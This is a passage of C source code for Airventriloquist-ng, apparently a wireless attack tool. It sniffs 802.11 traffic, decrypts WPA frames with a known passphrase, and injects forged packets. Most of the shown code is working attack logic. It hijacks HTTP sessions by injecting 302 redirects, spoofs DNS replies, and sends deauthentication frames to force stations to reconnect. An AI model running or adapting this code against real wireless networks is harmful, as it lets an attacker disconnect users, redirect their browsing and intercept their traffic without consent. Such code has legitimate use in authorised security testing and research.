						p_http = pkt + offset_proto + hdr_size;
						l_http = strlen(lopt.p_redir_pkt_str);

						// Copy the http frame we wish to send
						memcpy(p_http, lopt.p_redir_pkt_str, l_http);
						res_length
							= offset_proto + hdr_size + l_http
							  + extra_enc_length; // have to account for MIC

						// Set checksum to zero before calculating...
						p_resip->frag_off = 0x0000;
						// Incrementing the ID by something, Could try to
						// calculate this...
						p_resip->id = htons(ntohs(p_resip->id) + 1025);
						p_resip->tot_len = htons(l_http + hdr_size
												 + sizeof(struct ip_frame));
						p_resip->check = 0;
						p_resip->check = calcsum((void *) p_resip,
												 sizeof(struct ip_frame));

						// Lets calculate the TCP checksum
						p_restcp->checksum = 0;
						p_restcp->checksum = calcsum_tcp((void *) p_restcp,
														 (hdr_size + l_http),
														 p_resip->saddr,
														 p_resip->daddr);

						if (IEEE80211_FC1_WEP & wfrm->i_fc[1])
						{
							if (lopt.st_cur->keyver == 1)
							{
								res_length += 4;
							}
							encrypt_data_packet(pkt, res_length, lopt.st_cur);
							encrypt_data_packet(
								tmpbuf, tmpbuf_len, lopt.st_cur);
						}

						printf(COL_HTTPINJECT "---> Injecting Redirect Packet "
											  "to: " COL_HTTPINJECTDATA);
						PRINTMAC(lopt.st_cur->stmac);
						printf(COL_REST);

						if (send_packet(_wi_out,
										pkt,
										res_length,
										kRewriteSequenceNumber)
							!= 0)
							printf("Error Sending Packet\n");
						printf("\n");
						// Uncomment to send RST packet to the server
						// if (send_packet(_wi_out, tmpbuf, tmpbuf_len, kRewriteSequenceNumber) != 0)
						//    printf("ERROR: couldn't send Ack\n");
						return;
					}
				}
			}
			else if ((short) PROTO_UDP == p_ip->protocol && lopt.flag_dnsspoof)
			{
				struct udp_hdr * p_udp = (struct udp_hdr *) packet;

				// DNS packet
				if (53 == ntohs(p_udp->dport))
				{
					hexDump("DNS", (void *) packet, length);
					memcpy(pkt, packet_start, packet_start_length);
					packet_turnaround_80211(pkt);
					packet_turnaround_ip((struct ip_frame *) (pkt + offset_ip));
					packet_turnaround_ip_udp(
						(struct udp_hdr *) (pkt + offset_proto));

					struct udp_hdr * p_resudp
						= (struct udp_hdr *) (pkt + offset_proto);

					int dns_offset = offset_proto + sizeof(struct udp_hdr);
					uint8_t * p_dns = packet_start + dns_offset;
					uint8_t * p_resdns = pkt + dns_offset;

					// Copy the beginning part of the packet
					memcpy(p_resdns, DNS_RESP_PCKT_1, sizeof(DNS_RESP_PCKT_1));
					struct dns_query * p_dnsq = (struct dns_query *) p_dns;
					int dns_qlen = dns_name_end((uint8_t *) &p_dnsq->qdata,
												packet_start_length);

					// Copy the request DNS name into the response
					memcpy(p_resdns + sizeof(DNS_RESP_PCKT_1) - 1,
						   (void *) &p_dnsq->qdata,
						   dns_qlen);
					// Copy the rest of the DNS packet
					memcpy(p_resdns + sizeof(DNS_RESP_PCKT_1) - 1 + dns_qlen,
						   DNS_RESP_PCKT_2,
						   sizeof(DNS_RESP_PCKT_2));
					// Calculate the new resp length
					int dns_resplen = sizeof(DNS_RESP_PCKT_1) - 1 + dns_qlen
									  + sizeof(DNS_RESP_PCKT_2);

					struct sockaddr_in s_in;
					inet_pton(AF_INET, "127.0.0.1", &s_in); // Website will work
					memcpy(p_resdns + dns_resplen - 5, &s_in, 4);

					// copy the Transaction ID
					p_resdns[0] = p_dns[0];
					p_resdns[1] = p_dns[1];

					struct ip_frame * p_resip
						= (struct ip_frame *) (pkt + offset_ip);
					p_resip->tot_len
						= htons(dns_resplen + sizeof(struct udp_hdr)
								+ sizeof(struct ip_frame));
					// Set checksum to zero before calculating...
					p_resip->check = 0;
					p_resip->check
						= calcsum((void *) p_resip, sizeof(struct ip_frame));

					p_resudp->len = htons(dns_resplen + sizeof(struct udp_hdr));
					p_resudp->checksum = 0;
					p_resudp->checksum = calcsum_udp((void *) p_resudp,
													 ntohs(p_resudp->len),
													 p_resip->saddr,
													 p_resip->daddr);

					hexDump("sending DNS Response:", pkt, packet_start_length);

					packet_start_length = dns_offset + dns_resplen;
					if (IEEE80211_FC1_WEP & wfrm->i_fc[1])
					{
						if (lopt.st_cur->keyver == 1)
						{
							packet_start_length += 4;
						}

						packet_start_length += extra_enc_length;
						encrypt_data_packet(
							pkt, packet_start_length, lopt.st_cur);
					}

					if (send_packet(_wi_out,
									pkt,
									(size_t) packet_start_length,
									kRewriteSequenceNumber)
						!= 0)
						printf("Error Sending Packet\n");

					return;
				}
			}

			else if ((1 == lopt.flag_icmp_resp)
					 && (short) PROTO_ICMP == p_ip->protocol)
			{
				struct icmp * p_icmp = (struct icmp *) packet;
				if (p_icmp->icmp_type == 8)
				{
					printf("ICMP Request Caught, %d, %d\n",
						   p_icmp->icmp_id,
						   p_icmp->icmp_seq);

					// copy the original Packet to our response packet buffer
					memcpy(pkt, packet_start, packet_start_length);

					packet_turnaround_80211(pkt);
					packet_turnaround_ip((struct ip_frame *) (pkt + offset_ip));

					// Point to the IP frame
					struct ip_frame * p_resip
						= (struct ip_frame *) (pkt + offset_ip);
					// Set checksum to zero before calculating checksum...
					p_resip->check = 0;
					p_resip->check
						= calcsum((void *) p_resip, sizeof(struct ip_frame));

					struct icmp * p_resicmp
						= (struct icmp *) (pkt + size_80211hdr
										   + sizeof(struct llc_frame)
										   + sizeof(struct ip_frame));
					// Set the ICMP type as response
					p_resicmp->icmp_type = 0;

					// Calculate how much data there is to calculate checksum
					// over
					int icmp_length
						= packet_start_length
						  - (size_80211hdr + sizeof(struct llc_frame)
							 + sizeof(struct ip_frame))
						  - extra_enc_length; // Don't forget extra MIC at the
					// end of the frame

					if (lopt.st_cur->keyver == 1)
					{
						icmp_length -= 4;
					}
					p_resicmp->icmp_cksum = 0;
					p_resicmp->icmp_cksum
						= calcsum((void *) p_resicmp, icmp_length);

					if (IEEE80211_FC1_WEP & wfrm->i_fc[1])
					{
						encrypt_data_packet(
							pkt, packet_start_length, lopt.st_cur);
					}

					printf("Sending ICMP response\n");
					if (send_packet(_wi_out,
									pkt,
									(size_t) packet_start_length,
									kRewriteSequenceNumber)
						!= 0)
						printf("Error Sending Packet\n");

					return;
				}
			}
		}
	}
}

static bool is_adhoc_frame(uint8_t * packet)
{
	uint8_t * p_stmac = packet_get_sta_80211(packet);

	if (NULL == p_stmac)
	{
		return (TRUE);
	}
	else
	{
		return (FALSE);
	}
}

static bool find_station_in_db(uint8_t * p_stmac)
{
	lopt.st_prv = NULL;
	lopt.st_cur = lopt.st_1st;

	while (lopt.st_cur != NULL)
	{
		if (!memcmp(lopt.st_cur->stmac, p_stmac, 6)) break;

		lopt.st_prv = lopt.st_cur;
		lopt.st_cur = lopt.st_cur->next;
	}

	if (NULL == lopt.st_cur)
		// If not fount, opt.st_cur == NULL
		return (FALSE);
	else
		// If found, opt.st_cur == p_stmac
		return (TRUE);
}

static bool alloc_new_station_in_db(void)
{
	lopt.st_cur = (struct WPA_ST_info *) malloc(sizeof(struct WPA_ST_info));

	if (NULL == lopt.st_cur)
	{
		perror("station malloc failed");
		return (FALSE);
	}
	// Zero out memory of newly allocated structure
	memset(lopt.st_cur, 0, sizeof(struct WPA_ST_info));
	return (TRUE);
}

static inline bool is_wfrm_encrypted(struct ieee80211_frame * wfrm)
{
	REQUIRE(wfrm != NULL);

	return (wfrm->i_fc[1] & IEEE80211_FC1_WEP);
}

static inline bool is_length_lt_wfrm(int length)
{
	return ((int) sizeof(struct ieee80211_frame) >= length);
}

static inline bool mac_is_multi_broadcast(unsigned char stmac[6])
{
	if ((0xFF == stmac[0]) && (0xFF == stmac[1])) return (TRUE);
	if ((0x33 == stmac[0]) && (0x33 == stmac[1])) return (TRUE);
	return (FALSE);
}

static void process_station_data(uint8_t * packet, int length)
{
	if (is_length_lt_wfrm(length)) return;

	struct ieee80211_frame * wfrm = (struct ieee80211_frame *) packet;

	uint8_t * p_stmac = packet_get_sta_80211(packet);
	ALLEGE(p_stmac != NULL);
	uint8_t * p_bssid = packet_get_bssid_80211(packet);
	ALLEGE(p_bssid != NULL);

	if (!find_station_in_db(p_stmac))
	{
		if (FALSE == alloc_new_station_in_db())
		{
			return;
		}

		if (lopt.st_1st == NULL)
			lopt.st_1st = lopt.st_cur;
		else
			lopt.st_prv->next = lopt.st_cur;

		memcpy(lopt.st_cur->stmac, p_stmac, 6);
		memcpy(lopt.st_cur->bssid, p_bssid, 6);

		if (TRUE == lopt.flag_verbose)
		{
			printf(COL_NEWSTA "Added new station\n" COL_NEWSTADATA);
			printf("Station = ");
			PRINTMAC(p_stmac);
			printf("BSSID   = ");
			PRINTMAC(lopt.st_cur->bssid);
			printf(COL_REST);
			// Attempt to force a de-auth and reconnect automagically ;)
		}

		if ((is_wfrm_encrypted(wfrm)) && (TRUE == lopt.deauth))
		{
			// This frame was encrypted, so send some deauths to the station
			// Hoping to reauth/reassoc to force 4 way handshake
			if (FALSE == mac_is_multi_broadcast(lopt.st_cur->stmac))
			{
				printf("Doing deauth\n");
				deauth_station(lopt.st_cur);
				printf("\nFinished Deauth Attempt\n");
			}
		}
	}
}

static inline bool wfrm_is_tods(struct ieee80211_frame * wfrm)
{
	REQUIRE(wfrm != NULL);

	return (wfrm->i_fc[1] & IEEE80211_FC1_DIR_TODS);
}

static inline bool wfrm_is_fromds(struct ieee80211_frame * wfrm)
{
	REQUIRE(wfrm != NULL);

	return (wfrm->i_fc[1] & IEEE80211_FC1_DIR_FROMDS);
}

static inline bool is_wfrm_qos(struct ieee80211_frame * wfrm)
{
	REQUIRE(wfrm != NULL);

	return (IEEE80211_FC0_SUBTYPE_QOS & wfrm->i_fc[0]);
}

static bool is_wfrm_already_processed(uint8_t * packet, int length)
{
	struct ieee80211_frame * wfrm = (struct ieee80211_frame *) packet;

	// check if we haven't already processed this packet
	// If we have, just return, don't process packet twice
	uint32_t crc = calc_crc_buf(packet, length);

	// IF TODS
	if (wfrm_is_tods(wfrm))
	{
		if (crc == lopt.st_cur->t_crc)
		{
			return (TRUE);
		}
		lopt.st_cur->t_crc = crc;
	}
	// IF FROMDS
	else if (wfrm_is_fromds(wfrm))
	{
		if (crc == lopt.st_cur->f_crc)
		{
			return (TRUE);
		}
		lopt.st_cur->f_crc = crc;
	}
	// this frame hasn't been processed yet
	return (FALSE);
}

static struct llc_frame * find_llc_frm_ptr(uint8_t * packet, int length)
{
	if (is_length_lt_wfrm(length)) return (NULL);

	int size_80211hdr = sizeof(struct ieee80211_frame);
	if (is_wfrm_qos((struct ieee80211_frame *) packet))
	{
		size_80211hdr = sizeof(struct ieee80211_qosframe);
	}

	struct llc_frame * p_llc = (struct llc_frame *) (packet + size_80211hdr);
	return (p_llc);
}

static void process_wireless_data_packet(uint8_t * packet, int length)
{
	uint8_t * packet_start = packet;
	int packet_start_length = length;

	struct ieee80211_frame * wfrm = (struct ieee80211_frame *) packet;

	if (is_adhoc_frame(packet))
	{
		return;
	}

	// process station,
	// if it exists, opt.st_cur will point to it
	// if it doesn't exist, it will create an entry
	//    with opt.st_cur pointing to it
	process_station_data(packet, length);

	if (is_wfrm_already_processed(packet, length))
	{
		return;
	}

	struct llc_frame * p_llc = find_llc_frm_ptr(packet, length);
	if (NULL == p_llc)
	{
		return;
	}

	// Check to see if this is an encrypted frame
	if (0xAA != p_llc->i_dsap && 0xAA != p_llc->i_ssap)
	{
		// OK so it's not valid LLC, lets check WEP
		struct wep_frame * p_wep = (struct wep_frame *) packet;

		// check the extended IV flag
		// I copied from airdecap-ng, not actually sure about WEP and don't care
		// at this point
		if ((wfrm->i_fc[1] & IEEE80211_FC1_WEP) && (0 != (p_wep->keyid & 0x20)))
		{
			// Unsupported ;)
			printf("unsupported encryption\n");
			return;
		}
		else
		{
			if (opt.crypt != CRYPT_WPA)
			{
				return;
			}
			// Apparently this is a WPA packet
			// Don't bother with this if we don't have a valid ptk for this
			// station
			if ((NULL == lopt.st_cur) || (!lopt.st_cur->valid_ptk))
			{
				return;
			}
			else
			{
				// if the PTK is valid, try to decrypt
				if (lopt.st_cur->keyver == 1)
				{
					if (decrypt_tkip(packet_start,
									 packet_start_length,
									 lopt.st_cur->ptk + 32)
						== 0)
					{
						printf("TKIP decryption on this packet failed :( \n");
						return;
					}
				}
				else
				{
					if (decrypt_ccmp(packet_start,
									 packet_start_length,
									 lopt.st_cur->ptk + 32)
						== 0)
					{
						printf("CCMP decryption on this packet failed :( \n");
						hexDump("failed to decrypt",
								packet_start,
								packet_start_length);
						return;
					}
				}

				process_unencrypted_data_packet(
					packet_start, packet_start_length, 0);
				return;
			}
		}
	}
	else if (0xAA == p_llc->i_dsap && 0xAA == p_llc->i_ssap)
	{
		process_unencrypted_data_packet(packet_start, packet_start_length, 0);
	}
}

static void process_wireless_packet(uint8_t * packet, int length)
{
	REQUIRE(packet != NULL);

	struct ieee80211_frame * wfrm = (struct ieee80211_frame *) packet;
	short fc = *wfrm->i_fc;

	if ((IEEE80211_FC0_TYPE_DATA & fc))
	{
		process_wireless_data_packet(packet, length);
	}
}

static int do_active_injection(void)
{
	struct timeval tv;
	fd_set rfds;
	int caplen, ret;
	int atime = 200;
	memset(tmpbuf, 0, 4096);

	printf("opt.port_out = %d, opt.s_face = %s\n", opt.port_out, opt.s_face);
	if (opt.port_out > 0)
	{
		atime += 200;
		PCT;
		printf("Testing connection to injection device %s\n", opt.iface_out);
		ret = tcp_test(opt.ip_out, opt.port_out);
		if (ret != 0)
		{
			return (1);
		}
		printf("\n");

		/* open the replay interface */
		_wi_out = wi_open(opt.iface_out);
		if (!_wi_out) return (1);
		printf("\n");
		dev.fd_out = wi_fd(_wi_out);
		wi_get_mac(_wi_out, dev.mac_out);
		if (opt.s_face == NULL)
		{
			_wi_in = _wi_out;
			dev.fd_in = dev.fd_out;

			/* XXX */
			dev.arptype_in = dev.arptype_out;
			wi_get_mac(_wi_in, dev.mac_in);
		}
	}

	if (opt.s_face && opt.port_in > 0)
	{
		atime += 200;
		PCT;
		printf("Testing connection to capture device %s\n", opt.s_face);
		ret = tcp_test(opt.ip_in, opt.port_in);
		if (ret != 0)
		{
			return (1);
		}
		printf("\n");

		/* open the packet source */
		_wi_in = wi_open(opt.s_face);
		if (!_wi_in) return (1);
		dev.fd_in = wi_fd(_wi_in);
		wi_get_mac(_wi_in, dev.mac_in);
		printf("\n");
	}
	else if (opt.s_face && opt.port_in <= 0)
	{
		/* open the replay interface */
		_wi_out = wi_open(opt.iface_out);
		if (!_wi_out) return (1);
		printf("\n");
		dev.fd_out = wi_fd(_wi_out);
		wi_get_mac(_wi_out, dev.mac_out);

		_wi_in = wi_open(opt.s_face);
		if (!_wi_in) return (1);
		dev.fd_in = wi_fd(_wi_in);
		wi_get_mac(_wi_in, dev.mac_in);
		printf("s_face, port_in\n");
	}

	if (opt.port_in <= 0)
	{
		/* avoid blocking on reading the socket */
		if (fcntl(dev.fd_in, F_SETFL, O_NONBLOCK) < 0)
		{
			perror("fcntl(O_NONBLOCK) failed");
			return (1);
		}
	}

	if (getnet(_wi_in,
			   NULL,
			   0,
			   0,
			   opt.f_bssid,
			   opt.r_bssid,
			   (uint8_t *) opt.r_essid,
			   opt.ignore_negative_one,
			   0 /* nodetect */)
		!= 0)
		return (EXIT_FAILURE);

	rand_init();

	// Set our bitrate to the loudest/most likely to reach the station/AP...
	set_bitrate(_wi_out, RATE_1M);

	// main Loop
	while (1)
	{
		FD_ZERO(&rfds);
		FD_SET(dev.fd_in, &rfds);

		tv.tv_sec = 0;
		tv.tv_usec = 1000; // one millisecond

		if (select(dev.fd_in + 1, &rfds, NULL, NULL, &tv) < 0)
		{
			if (errno == EINTR) continue;
			perror("select failed");
			return (1);
		}
		if (!FD_ISSET(dev.fd_in, &rfds)) continue;

		memset(h80211, 0, sizeof(h80211));
		caplen = read_packet(_wi_in, h80211, sizeof(h80211), NULL);

		// Ignore small frames...
		if (caplen <= 30) continue;

		// Check for 802.11 data frame, first byte is FC
		if ((IEEE80211_FC0_TYPE_DATA & h80211[0]))
		{
			process_wireless_packet(h80211, caplen);
		}
	}
}

int main(int argc, char * argv[])
{
	int option = 0;
	int option_index = 0;

	memset(&dev, 0, sizeof(dev));
	memset(&opt, 0, sizeof(struct communication_options));
	memset(&lopt, 0, sizeof(struct local_options));

	opt.f_type = -1;
	opt.f_subtype = -1;
	opt.f_minlen = -1;
	opt.f_maxlen = -1;
	opt.f_tods = -1;
	opt.f_fromds = -1;
	opt.f_iswep = -1;

	opt.a_mode = -1;
	lopt.deauth = 0;
	opt.delay = 15;
	opt.r_smac_set = 0;
	opt.npackets = 1;
	opt.rtc = 1;
	opt.f_retry = 0;
	opt.reassoc = 0;
	opt.s_face = NULL;
	opt.iface_out = NULL;
	lopt.p_hijack_str = NULL;
	lopt.flag_verbose = 0;
	lopt.flag_icmp_resp = 0;
	lopt.flag_http_hijack = 0;
	lopt.flag_dnsspoof = 0;

	char * p_redir_url = NULL;

	progname = getVersion(
		"Airventriloquist-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC);

	while (1)
	{

		option_index = 0;
		static const struct option long_options[] = {{"redirect", 1, 0, 'r'},
													 {"interface", 1, 0, 'i'},
													 {"hijack", 1, 0, 's'},
													 {"passphrase", 1, 0, 'p'},
													 {"essid", 1, 0, 'e'},
													 {"deauth", 0, 0, 'd'},
													 {"icmp", 0, 0, 'c'},
													 {"dns", 1, 0, 'n'},
													 {"verbose", 0, 0, 'v'},
													 {"help", 0, 0, 'h'},
													 {0, 0, 0, 0}};

		option = getopt_long(
			argc, argv, "i:n:r:s:p:e:dcv", long_options, &option_index);

		if (option < 0) break;

		switch (option)
		{
			case 0:
				break;

			case 'i':
				printf("Selected Interface is %s\n", optarg);
				opt.s_face = opt.iface_out = optarg;
				opt.port_in
					= get_ip_port(opt.s_face, opt.ip_in, sizeof(opt.ip_in) - 1);
				opt.port_out = get_ip_port(
					opt.iface_out, opt.ip_out, sizeof(opt.ip_out) - 1);
				break;

			case 'v':
				printf("Verbose enabled\n");
				lopt.flag_verbose = 1;
				break;

			case 'd':
				printf("Deauthing enabled\n");
				lopt.deauth = 1;
				break;

			case 'c':
				printf("Debugging by responding to ICMP enabled\n");
				lopt.flag_icmp_resp = 1;
				break;

			case 'r':
				printf("Redirect: %s\n", optarg);
				p_redir_url = optarg;
				break;

			case 'n':
			{
				printf("DNS IP: %s\n", optarg);
				int retval = inet_pton(AF_INET, optarg, &lopt.p_dnsspoof_ip);
				if (1 != retval)
				{
					printf("Error occurred converting IP, please specify a "
						   "valid IP, because apparently %s is not\n",
						   optarg);
					free(progname);
					return (EXIT_FAILURE);
				}
				lopt.flag_dnsspoof = 1;
			}
			break;

			case 's':
				printf("Hijack search term: %s\n", optarg);
				lopt.p_hijack_str = optarg;
				lopt.flag_http_hijack = 1;
				break;

			case 'e':
				if (lopt.essid[0])
				{
					printf("ESSID already specified.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					free(progname);
					return (EXIT_FAILURE);
				}

				memset(lopt.essid, 0, sizeof(lopt.essid));
				strncpy(lopt.essid, optarg, sizeof(lopt.essid) - 1);
				break;

			case 'p':
				if (opt.crypt != CRYPT_NONE)
				{
					printf("Encryption key already specified.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					free(progname);
					return (EXIT_FAILURE);
				}

				opt.crypt = CRYPT_WPA;

				memset(lopt.passphrase, 0, sizeof(lopt.passphrase));
				strncpy(lopt.passphrase, optarg, sizeof(lopt.passphrase) - 1);
				break;

			case 'h':
				printf(usage, progname);
				free(progname);
				return (EXIT_SUCCESS);

			case ':':
			default:
				printf("\"%s --help\" for help.\n", argv[0]);
		}
	}

	if (opt.crypt == CRYPT_WPA)
	{
		if (lopt.passphrase[0] != '\0')
		{
			/* compute the Pairwise Master Key */

			if (lopt.essid[0] == '\0')
			{
				printf("You must also specify the ESSID (-e). This is the "
					   "broadcast SSID name\n");
				printf("\"%s --help\" for help.\n", argv[0]);
				return (EXIT_FAILURE);
			}

			calc_pmk(lopt.passphrase, lopt.essid, lopt.pmk);
		}
	}

	if (1 == lopt.flag_http_hijack)
	{

		if (NULL != lopt.p_hijack_str)
		{
			printf("hijack string = %s\n", lopt.p_hijack_str);
		}
		else
		{
			printf("ERROR: No proper hijack string defined\n");
		}

		if (NULL != p_redir_url)
		{
			lopt.p_redir_url = p_redir_url;

			printf("We have a redirect specified\n");
			char * p_url = strstr(packet302_redirect, REDIRECT_PLACEHOLDER);
			ALLEGE(p_url != NULL);

			int total_len = strlen(packet302_redirect)
							- strlen(REDIRECT_PLACEHOLDER)
							+ strlen(p_redir_url);

			// Allocate memory if we're modifying this
			lopt.p_redir_pkt_str = malloc(total_len);
			if (lopt.p_redir_pkt_str != NULL)
			{
				char * p_curr = lopt.p_redir_pkt_str;
				int len_first = p_url - packet302_redirect;
				// Copy the first part of the packet up to the URL in the header
				memcpy(p_curr, packet302_redirect, len_first);

				// Next copy the specified redirection URL from user input
				p_curr = lopt.p_redir_pkt_str + len_first;
				memcpy(p_curr, p_redir_url, strlen(p_redir_url));

				// Copy the remainder of the packet...
				p_curr += strlen(p_redir_url);
				memcpy(p_curr,
					   p_url + strlen(REDIRECT_PLACEHOLDER),
					   total_len - len_first - strlen(p_redir_url));
			}
			else
			{
				printf("ERROR: wasn't able to allocate the memory needed to do "
					   "redirect... \n");
				exit(EXIT_FAILURE);
			}
		}
		else
		{
			printf("WARNING: \n\tHijack term specified but no redirect "
				   "specified\n");
			printf("\tUsing the default redirect specified\n");
			// Using default redirect in the hardcoded header....
			lopt.p_redir_pkt_str = packet302_redirect;
		}
	}

	if (opt.s_face == NULL)
	{
		printf(usage, progname);
		free(progname);
		printf(COL_RED "Error, a interface must be specified\n\n" COL_REST);
		return (EXIT_FAILURE);
	}

	/* drop privileges */
	if (setuid(getuid()) == -1)
	{
		perror("setuid");
	}

	/* XXX */
	if (opt.r_nbpps == 0)
	{
		if (dev.is_wlanng || dev.is_hostap)
			opt.r_nbpps = 200;
		else
			opt.r_nbpps = 500;
	}

	/*
	   random source so we can identify our packets
	*/
	opt.r_smac[0] = 0x00;
	opt.r_smac[1] = rand_u8();
	opt.r_smac[2] = rand_u8();
	opt.r_smac[3] = rand_u8();
	opt.r_smac[4] = rand_u8();
	opt.r_smac[5] = rand_u8();

	opt.r_smac_set = 1;

	// if there is no -h given, use default hardware mac

	if (maccmp(opt.r_smac, NULL_MAC) == 0)
	{
		memcpy(opt.r_smac, dev.mac_out, 6);
		if (opt.a_mode != 0 && opt.a_mode != 4 && opt.a_mode != 9)
		{
			printf("No source MAC (-h) specified. Using the device MAC "
				   "(%02X:%02X:%02X:%02X:%02X:%02X)\n",
				   dev.mac_out[0],
				   dev.mac_out[1],
				   dev.mac_out[2],
				   dev.mac_out[3],
				   dev.mac_out[4],
				   dev.mac_out[5]);
		}
		printf("Using device MAC (%02X:%02X:%02X:%02X:%02X:%02X)\n",
			   dev.mac_out[0],
			   dev.mac_out[1],
			   dev.mac_out[2],
			   dev.mac_out[3],
			   dev.mac_out[4],
			   dev.mac_out[5]);
	}

	if (maccmp(opt.r_smac, dev.mac_out) != 0
		&& maccmp(opt.r_smac, NULL_MAC) != 0)
	{
		fprintf(stderr,
				"The interface MAC (%02X:%02X:%02X:%02X:%02X:%02X)"
				" doesn't match the specified MAC (-h).\n"
				"\tifconfig %s hw ether %02X:%02X:%02X:%02X:%02X:%02X\n",
				dev.mac_out[0],
				dev.mac_out[1],
				dev.mac_out[2],
				dev.mac_out[3],
				dev.mac_out[4],
				dev.mac_out[5],
				opt.iface_out,
				opt.r_smac[0],
				opt.r_smac[1],
				opt.r_smac[2],
				opt.r_smac[3],
				opt.r_smac[4],
				opt.r_smac[5]);
	}

	return (do_active_injection());
}
